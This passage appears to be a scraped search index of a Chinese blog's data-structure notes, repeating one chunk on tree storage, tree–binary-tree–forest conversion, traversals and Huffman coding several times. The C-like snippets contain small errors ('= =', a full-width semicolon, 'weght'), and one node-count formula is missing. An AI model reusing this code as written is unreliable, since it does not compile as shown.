//从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#后根次序遍历"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#按层次遍历"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#森林的遍历"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#先序遍历"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#中序遍历"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 